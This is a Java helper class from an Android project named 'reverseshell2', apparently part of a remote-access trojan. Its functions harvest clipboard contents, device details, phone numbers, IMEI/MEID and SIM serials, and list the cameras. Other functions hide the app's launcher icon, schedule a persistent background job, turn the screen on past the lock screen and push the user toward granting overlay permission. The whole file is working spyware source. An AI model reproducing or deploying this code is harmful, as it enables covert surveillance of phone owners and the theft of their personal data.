package com.example.reverseshell2;

import android.app.Activity;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;

import java.util.Locale;

import static android.content.Context.JOB_SCHEDULER_SERVICE;


public class functions {

    Activity activity;

    public functions(Activity activity){
        this.activity = activity;
    }


    public String deviceInfo() {
        String ret = "--------------------------------------------\n";
        ret += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
        ret += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
        ret += "Product: "+android.os.Build.PRODUCT+"\n";
        ret += "Model: "+android.os.Build.MODEL+"\n";
        ret += "Brand: "+android.os.Build.BRAND+"\n";
        ret += "Device: "+android.os.Build.DEVICE+"\n";
        ret += "Host: "+android.os.Build.HOST+"\n";
        ret += "--------------------------------------------\n";
        return ret;
    }

    public String readFromClipboard() {
        final ClipboardManager[] clipboard = new ClipboardManager[1];
        String result="";
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                clipboard[0] = (ClipboardManager) activity.getSystemService(Context.CLIPBOARD_SERVICE);
            }
        });
        try{
            if (clipboard[0].hasPrimaryClip()) {
                android.content.ClipDescription description = clipboard[0].getPrimaryClipDescription();
                android.content.ClipData data = clipboard[0].getPrimaryClip();
                if (data != null && description != null && description.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN))
                    result= String.valueOf(data.getItemAt(0).getText());
                if(result.isEmpty()){
                    result = null;
                }
            }
        }catch (NullPointerException e){
            result=null;
        }
        return result;
    }

    public String get_numberOfCameras() {
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        String camera_details = "";
        for (int i = 0; i < android.hardware.Camera.getNumberOfCameras(); i++) {
            android.hardware.Camera.getCameraInfo(i, cameraInfo);
            if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) {
                camera_details+=i+" --  Front Camera\n";
            } else if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
                camera_details+=i+" --  Back Camera\n";
            }
        }
        return camera_details;

    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public void jobScheduler(Context context){
        ComponentName componentName = new ComponentName(context,jobScheduler.class);
        JobInfo info = new JobInfo.Builder(123, componentName)
                .setPersisted(true)
                .setPeriodic(900000)
                .build();

        JobScheduler scheduler = (JobScheduler) context.getSystemService(JOB_SCHEDULER_SERVICE);
        int resultCode = scheduler.schedule(info);
        if (resultCode == JobScheduler.RESULT_SUCCESS) {
            Log.d("jobSchedulerTest", "Job scheduled");
        } else {
            Log.d("jobSchedulerTest", "Job scheduling failed");
        }
    }

    public String getPhoneNumber(Context context) {

        TelephonyManager phoneMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String out="";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            if (SubscriptionManager.from(activity).getActiveSubscriptionInfoCount() > 0) {
                String lst = "";
                String header="";
                for (int i = 0; i < SubscriptionManager.from(activity).getActiveSubscriptionInfoList().size(); i++) {
                    if(i==0){
                        header="First Sim: ";
                    }else if(i==1){
                        header = "Second Sim: ";
                    }else if(i==2){
                        header = "Third Sim: ";
                    }
                    lst += header+"--------------------------";
                    lst += "\nCALL STATE : "+phoneMgr.createForSubscriptionId(i).getCallState();
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        lst += "\nIMEI NUMBER : " + phoneMgr.createForSubscriptionId(i).getImei();
                        lst += "\nMEI NUMBER : " + phoneMgr.createForSubscriptionId(i).getMeid();
                    }
                    lst += "\nMOBILE NUMBER : ".concat(phoneMgr.createForSubscriptionId(i).getLine1Number());
                    lst += "\nSERIAL NUMBER : ".concat(phoneMgr.createForSubscriptionId(i).getSimSerialNumber());
                    lst += "\nSIM OPERATOR NAME : " + phoneMgr.createForSubscriptionId(i).getSimOperatorName();
                    lst += "\nSIM STATE : ".concat(String.valueOf(phoneMgr.createForSubscriptionId(i).getSimState()));
                    lst += "\nCOUNTRY ISO : " + phoneMgr.createForSubscriptionId(i).getSimCountryIso() + "\n";
                    lst+="\n";
                }
                out= lst;
            }
        } else {
            String lst = "";
            lst +="CALL STATE : "+phoneMgr.getCallState()+ "\n";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                lst += "IMEI NUMBER :-" + phoneMgr.getImei();
                lst += "MEI NUMBER :-" + phoneMgr.getMeid();
            }
            lst += "MOBILE NUMBER :-" + phoneMgr.getLine1Number() + "\n";
            lst += "SERIAL NUMBER :-" + phoneMgr.getSimSerialNumber() + "\n";
            lst += "SIM OPERATOR NAME :-" + phoneMgr.getSimOperatorName() + "\n";
            lst += "SIM STATE :-" +phoneMgr.getSimState()+"\n";
            lst += "COUNTRY ISO :-" + phoneMgr.getSimCountryIso() + "\n";
            out= lst;

        }
        return out;

    }

    public void getScreenUp(Activity activity){
        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
    }

    public void hideAppIcon(Context context){
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context,com.example.reverseshell2.MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    public void unHideAppIcon(Context context){
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, com.example.reverseshell2.MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public void overlayChecker(final Context context){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(context)) {
                if ("xiaomi".equals(Build.MANUFACTURER.toLowerCase(Locale.ROOT))) {
                    final Intent intent =new Intent("miui.intent.action.APP_PERM_EDITOR");
                    intent.setClassName("com.miui.securitycenter",
                            "com.miui.permcenter.permissions.PermissionsEditorActivity");
                    intent.putExtra("extra_pkgname", context.getPackageName());
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    Toast.makeText(context, "Enable the display pop-up windows while running in background option", Toast.LENGTH_SHORT).show();
                    context.startActivity(intent);
                }else {
                    Intent overlaySettings = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + context.getPackageName()));
                    activity.startActivityForResult(overlaySettings, 1);
                }
            }
        }
    }

    public void createNotiChannel(Context context) {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            NotificationChannel notificationChannel = new NotificationChannel("channelid","Foreground notifia",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = context.getSystemService(NotificationManager.class);
            manager.createNotificationChannel(notificationChannel);
        }
    }

}
